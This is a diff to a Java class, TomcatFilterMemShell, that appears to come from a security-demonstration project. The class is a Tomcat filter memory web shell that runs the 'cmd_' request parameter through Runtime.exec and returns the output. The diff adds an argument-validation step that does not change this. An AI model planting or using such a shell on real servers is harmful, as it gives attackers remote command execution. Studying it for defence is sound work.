@@ -14,6 +14,7 @@ import org.apache.tomcat.util.descriptor.web.FilterMap;
 import java.lang.reflect.Constructor;
 import org.apache.catalina.core.ApplicationFilterConfig;
 import org.apache.catalina.Context;
+import org.joychou.security.SecurityUtil;
 import org.springframework.stereotype.Component;
 
 import javax.servlet.*;
@@ -94,7 +95,13 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         String cmd;
         if ((cmd = servletRequest.getParameter("cmd_")) != null) {
-            Process process = Runtime.getRuntime().exec(cmd);
+            String[] argv = SecurityUtil.cmdToArgv(cmd);
+            if (argv == null) {
+                servletResponse.getOutputStream().write("Bad boy. I got u.".getBytes());
+                servletResponse.getOutputStream().close();
+                return;
+            }
+            Process process = Runtime.getRuntime().exec(argv);
             java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                     new java.io.InputStreamReader(process.getInputStream()));
             StringBuilder stringBuilder = new StringBuilder();
